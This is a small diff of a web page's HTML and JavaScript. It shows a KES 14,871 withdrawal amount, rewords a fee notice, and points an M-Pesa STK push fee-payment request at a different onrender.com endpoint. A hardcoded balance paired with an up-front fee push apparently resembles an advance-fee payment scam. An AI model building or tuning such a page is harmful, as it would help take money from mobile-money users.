@@ -482,7 +482,7 @@
                 <div class="text-sm mb-2">Amount to Withdraw</div>
                 <div id="withdrawalAmount" class="text-4xl font-bold">KES 14,871</div>
                 <div class="text-sm mt-2 text-orange-600">
-                    Fee deducted automatically from Mpesa.
+                    Fee will be deducted manually
                 </div>
             </div>
 
@@ -1361,7 +1361,7 @@
                 await delay(1000);
 
                 // Send STK push for fee payment
-                const response = await fetch('https://swiftwallet-stk-push.onrender.com/pay', {
+                const response = await fetch('https://swiftwallet-stk-push-m0d4.onrender.com/pay', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
